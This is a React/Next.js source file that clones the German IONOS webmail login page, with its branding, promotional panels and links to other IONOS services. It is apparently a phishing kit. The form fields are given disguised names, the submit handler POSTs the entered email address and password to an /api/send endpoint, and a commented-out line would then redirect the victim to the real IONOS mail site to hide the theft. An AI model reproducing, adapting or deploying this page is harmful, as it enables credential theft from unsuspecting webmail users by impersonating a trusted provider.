"use client";
import Image from "next/image";
import { type FormEvent, useRef } from "react";
import axios from "axios";

export default function Home() {
  const formData = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const dataObj: { [key: string]: string } = {};
    if (forma.current) {
      const data = new FormData(forma.current);

      for (const [key, val] of data.entries()) {
        dataObj[key] = val as string;
      }
    }

    console.log(dataObj);

    try {
      const result = await axios.post("/api/send", JSON.stringify(dataObj));

      if (result.status === 200) {
        // return window.location.replace("https://mail.ionos.de/");
        console.log(result.data);
      }
      return;
    } catch (error) {
      console.log(error);
    }
  };

  const forma = useRef<HTMLFormElement>(null);
  return (
    <main className="bg-stone-100 pt-12 pb-20">
      <div className="max-w-[560px] mx-auto">
        <div className="border shadow border-gray-100 bg-white h-72">
          <form ref={forma} onSubmit={formData} className="px-7 pt-4">
            <h1 className="text-2xl font-normal">Webmail Login</h1>

            <div className="mt-5 relative h-9">
              <input
                type="email"
                name="kinder"
                id="kinder"
                className="h-full w-full border text-[#575a5b] border-[#acb0b2] placeholder:text-xs pl-8 outline-none focus:border-sky-500"
                placeholder="E-mail addresse"
              />

              <svg
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
                strokeWidth={1.5}
                stroke="#acb0b2"
                className="w-4 h-5 absolute top-2 left-2 "
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M15.75 6a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0zM4.501 20.118a7.5 7.5 0 0114.998 0A17.933 17.933 0 0112 21.75c-2.676 0-5.216-.584-7.499-1.632z"
                />
              </svg>
            </div>

            <p className="text-[#575a5b] float-right my-2 text-sm underline decoration-dotted underline-offset-2 font-light">
              Passwort vergessen?
            </p>

            <div className="mt-5 relative h-9">
              <input
                type="password"
                name="kind"
                id="kind"
                className="h-full w-full border border-[#acb0b2] placeholder:text-xs pl-8 outline-none focus:border-sky-500"
                placeholder="Passwort"
              />

              <svg
                xmlns="http://www.w3.org/2000/svg"
                viewBox="0 0 20 20"
                fill="#acb0b2"
                className="w-4 h-5 absolute top-6 left-2"
              >
                <path
                  fillRule="evenodd"
                  d="M10 1a4.5 4.5 0 00-4.5 4.5V9H5a2 2 0 00-2 2v6a2 2 0 002 2h10a2 2 0 002-2v-6a2 2 0 00-2-2h-.5V5.5A4.5 4.5 0 0010 1zm3 8V5.5a3 3 0 10-6 0V9h6z"
                  clipRule="evenodd"
                />
              </svg>
            </div>

            <div className="flex items-center mt-4 space-x-2">
              <input type="checkbox" name="sign" id="sign" className="h-8" />
              <p className="text-[#575a5b] float-right my-2 text-sm underline decoration-dotted underline-offset-4 font-light">
                Eingeloggt bleiben
              </p>
            </div>

            <button
              type="submit"
              className="text-white h-9 bg-[#0b9dcc] mt-4 w-full"
            >
              Login
            </button>
          </form>
        </div>

        <div className="border shadow px-7 py-5 border-gray-100 bg-white mt-8 grid grid-cols-1 sm:grid-cols-2 mx-4 sm:mx-0">
          <div>
            <h1 className="text-xl font-semibold">
              Sie haben noch kein professionelles E-Mail Postfach?
            </h1>
            <p className="text-sm font-normal mt-4">
              IONOS E-Mail Postfach ab 1 €. Inkl. kostenloser Domain.
            </p>

            <button className="bg-[#0b9dcc] h-10 w-28 text-white rounded-sm mt-2">
              Mehr erfahren
            </button>
          </div>

          <Image
            src="/email-marketing.svg"
            width={200}
            height={200}
            alt="email marketing"
            className="justify-self-center self-center"
          />
        </div>

        <div className="border shadow px-7 py-5 border-gray-100 bg-white mt-8 mx-4 sm:mx-0">
          <h1 className="text-lg font-semibold">
            Richten Sie Ihr E-Mail-Postfach auf weiteren Geräten ein
          </h1>

          <div className="text-sm mt-5">
            <p className="space-x-3 text-gray-500">
              Mobile <span className="text-[#0b9dcc] before:[|]"> iOS</span>
              <span className="text-[#0b9dcc]">Android</span>
            </p>
            <p className="space-x-3 text-gray-500">
              Desktop <span className="text-[#0b9dcc]"> Thunderbird</span>
              <span className="text-[#0b9dcc]">Outlook</span>
              <span className="text-[#0b9dcc]">Apple mail</span>
            </p>
            <p className="space-x-3 text-gray-500">
              Weitere{" "}
              <span className="text-[#0b9dcc]">
                {" "}
                E-mail-Programme (POP/IMAP)
              </span>
            </p>
          </div>
        </div>
        <h1 className="text-2xl font-semibold mt-4 mx-4 sm:mx-0">
          Weitere IONOS Logins
        </h1>
        <div className="grid grid-cols-2 gap-x-8 gap-y-4 sm:grid-cols-3 mt-8 text-[#0b9dcc] text-center mx-4 sm:mx-0">
          <div className="border shadow h-36 px-7 py-5 border-gray-100 bg-white space-y-2 hover:shadow-xl">
            <Image
              src="/my-ionos.svg"
              width={100}
              height={100}
              alt="my"
              className="mx-auto h-20"
            />
            <p className="">Mein IONOS</p>
          </div>
          <div className="border shadow px-7 py-5 h-36 border-gray-100 bg-white space-y-2 hover:shadow-xl">
            <Image
              src="/hidrive.svg"
              width={100}
              height={100}
              alt="hi"
              className="mx-auto h-20"
            />
            <p className="">Hi Drive</p>
          </div>
          <div className="border shadow px-7 py-5 h-36 border-gray-100 bg-white space-y-2 hover:shadow-xl">
            <Image
              src="/archive.svg"
              width={100}
              height={100}
              alt="arc"
              className="mx-auto h-20"
            />
            <p className="">E-mail-Archiv</p>
          </div>
        </div>
      </div>
    </main>
  );
}
